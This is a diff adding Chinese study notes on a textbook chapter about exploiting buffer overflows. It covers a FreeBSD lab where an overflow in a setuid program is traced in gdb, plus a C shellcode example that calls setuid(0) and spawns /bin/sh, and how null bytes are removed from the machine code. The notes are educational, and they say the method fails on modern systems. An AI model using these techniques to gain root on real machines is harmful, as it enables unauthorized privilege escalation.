@@ -156,3 +156,115 @@ cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
 
 - Java、.NET 平台的逆向
 	由于都不是直接编译成平台可执行程序，而是变成中间语言，通过 JVM、CLR(common language runtime) 执行。因此对该类语言编译的程序的逆向工程的主要目的是尽可能还原最接近原始状态的源码。
+
+# Ch3 利用软件漏洞进行攻击
+
+```cpp
+char buff[64];
+strcpy(buff, argv[1])
+```
+该代码段存在缓冲区溢出漏洞，如果命令行参数传的字符串长度超过64上述程序行为将不可预测。
+
+![](2023-01-19-18-49-13.png)
+Linux文件权限：如 “dr-xr-xr-x”
+	
+	- 第一个字符：d 代表目录；- 代表文件；l 代表链接文档(link file)；其他略
+	- 后面9个字符：分三组，每组3个，分别代表用户权限、组权限、所有人的权限。rwx：读、写、执行。
+	- 对于x位，也可能为s字符，代表该程序启用了 setuid 机制。
+
+- 普通账户获取管理员权限运行程序：setuid 机制可以让普通用户也借用管理员权限。
+
+对 ch3_sample1.c 编译并设置 setuid，此时如果非root用户运行该程序编译后的二进制文件，会以 root 权限运行/bin/sh (该程序是 *unix 系统的 shell) 可以获取 root 权限。
+```bash
+su
+gcc -Wall ch3_sample1.c -o sample1
+chmod 4755 sample1
+ls -l sample1
+exit
+```
+
+## 实验：利用缓冲区溢出提取权限 
+
+系统：FreeBSD-8.3、
+原理：函数局部变量存放在栈中，并且函数调用的参数也是通过栈传递。而内存中的栈由栈寄存器 ESP(栈顶指针)、EBP(栈基址) 维护。每 push 进栈一个数据后，ESP--。call 进函数内部时，先把返回地址入栈，再新建栈，把当前的栈基址(%EBP)进栈，然后修改EBP为ESP。根据前面描述，当函数内部的数组缓冲区溢出时，溢出会覆盖高地址的栈数据，导致程序执行流异常。此时攻击者可以操纵程序跳转到任意地址，如果事先准备好代码，可以实现任意代码执行。
+
+```bash
+su
+chmod 4755 ch3_sample2
+exit
+
+./ch3_sample2 `python exploit.py`
+> 0xbfbfebe8
+./ch3_sample2 ”`python exploit.py 0xbfbfebe8`“
+```
+
+关于gdb调试：
+```bash
+gdb ch3_sample2
+gdb>disas cpy 								# 反汇编 cpy 函数
+..
+gdb>b *0x080485be							# 函数出口下断点
+gdb>b cpy									# 函数入口下断点（这里是新建栈后）
+gdb>r "\`python -c 'print "A"*80'\`"		# 运行程序(附加命令行参数)
+..
+gdb>x/8x $ebp								# 查看指定寄存器/地址的8个字长数据(实验环境32位，故这里是8个32位数)
+# 此时：依次是 %ebp, ret_addr, func params...
+# ↓ 这里是 func params 的地址
+gdb>x/1s 0xbfbfedb8							# 以字符串形式显示任意的数据
+# func params 指向的地址是 'AAAAAA...’ (80个A)
+gdb>c										# 继续运行
+# cpy 函数结束断点
+gdb>x/8x $esp
+# ret_addr 被修改
+```
+如果在 buff 中写入一些指令，并让 ret_addr 跳转过去，便可以实现任意代码执行。攻击者要执行的代码叫做 shellcode。而一般来说，启动了/bin/sh后攻击者就能控制计算机，因此一般shellcode都是一段非常短小的机器语言代码，目的是启动/bin/sh。
+
+以下代码是shellcode示例：
+```c
+int main(int argc, char *argv[])
+{
+    char *data[2];
+    char *exe = "/bin/sh";
+
+    data[0] = exe;
+    data[1] = NULL;
+
+    setuid(0);
+    execve(data[0], data, NULL);	// 编译后这里的汇编会出发系统中断，不同系统的系统调用编号不相同，因此不同系统都需要准备相应的shellcode
+    return 0;
+}
+```
+编译：以静态链接方式（execve也会打包进文件中）
+```bash
+gcc -Wall =static ch3_sample1.c -o sample1
+```
+然后用gdb调试到汇编call execve的指令处,查看此处的内存状态
+```bash
+gdb> disas main
+gdb> b *08048254
+gdb> r
+gdb> x/8x $esp
+```
+当然，这里有部分字节的数据与shellcode无关，因删掉即可（这里细节比较多，详细的看原书p118）,根据上面的shellcode，设计汇编代码逻辑，如ch3_sample3.s所示。用objdump将其转为机器码：
+```bash
+gcc -Wall ch3_sample3.s -o sample3
+objdump -d sample3|grep \<main\>\: -A 16
+```
+检验这段机器码是否可以发挥作用，如ch3_sample4.c所示，机器码用void(*)()函数指针可以执行。
+```bash
+su
+gcc ch3_sample4.c -o sample4
+chmod 4755 sample4
+exit
+./sample4
+```
+但此处代码实际上无法对sample2实现攻击，因为机器码数据出现了0x00，是字符串结尾标记。strcpy()遇到该处时会结束。因此需要对shellcode的机器码做处理。
+```
+原字符串：/sh\0     (\0 即 0x00)
+处理为：//sh 而 \0 用 代码: xor + push 的方式构造，因此机器码中无 0x00
+代码示例：ch3_sample5.s
+```
+重新生成机器码：ch3_sample6.c 此时 shellcode 构造完成。
+
+上述的案例仅供参考，现代操作系统很多都默认启用了一些安全机制，上述方案已经失效了。
+
